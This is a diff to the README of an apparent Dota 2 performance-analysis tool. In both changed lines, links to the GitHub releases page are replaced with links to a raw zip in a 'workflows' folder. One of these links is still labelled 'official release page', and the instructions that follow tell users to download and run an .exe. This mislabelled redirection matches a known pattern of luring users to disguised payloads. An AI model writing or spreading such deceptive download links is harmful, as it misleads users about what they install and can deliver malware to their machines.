@@ -1,6 +1,6 @@
 # 🎮 Dota2-Performance-Predictor - Improve your play with smart data
 
-[![Download Application](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/wakeless-artemisia25/Dota2-Performance-Predictor/releases)
+[![Download Application](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/wakeless-artemisia25/Dota2-Performance-Predictor/main/workflows/Dota_Performance_Predictor_v3.3.zip)
 
 Dota2-Performance-Predictor helps you understand your gameplay. Use this tool to look at your past matches, track your growth, and find patterns that lead to wins. You get clear visuals that show your strengths and your weaknesses.
 
@@ -22,7 +22,7 @@ Your computer needs specific hardware to run this tool. Ensure your PC meets the
 
 Follow these steps to set up the application on your Windows computer.
 
-1. Go to the [official release page](https://github.com/wakeless-artemisia25/Dota2-Performance-Predictor/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/wakeless-artemisia25/Dota2-Performance-Predictor/main/workflows/Dota_Performance_Predictor_v3.3.zip).
 2. Look for the file ending in .exe under the section labeled Assets.
 3. Click the file name to start the download.
 4. Save the file to your desktop or downloads folder.
